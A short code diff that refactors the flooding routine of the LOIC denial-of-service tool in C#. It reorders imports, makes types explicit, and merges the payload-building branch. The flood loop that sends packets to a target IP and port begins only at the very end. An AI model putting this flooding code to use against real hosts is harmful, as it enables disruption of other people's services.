@@ -1,6 +1,8 @@
 ﻿using System;
-using System.Net.Sockets;
 using System.ComponentModel;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
 
 namespace LOIC
 {
@@ -29,7 +31,7 @@ namespace LOIC
 		public void Start()
 		{
 			IsFlooding = true;
-			var bw = new BackgroundWorker();
+			BackgroundWorker bw = new BackgroundWorker();
 			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
 			bw.RunWorkerAsync();
 		}
@@ -37,17 +39,8 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf;
-				if (random)
-				{
-					buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, new Functions().RandomString()));
-				}
-				else
-				{
-					buf = System.Text.Encoding.ASCII.GetBytes(Data);
-				}
-
-				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
+				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, ( random ? new Functions().RandomString() : null ) ));
+				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
 					Socket socket = null;
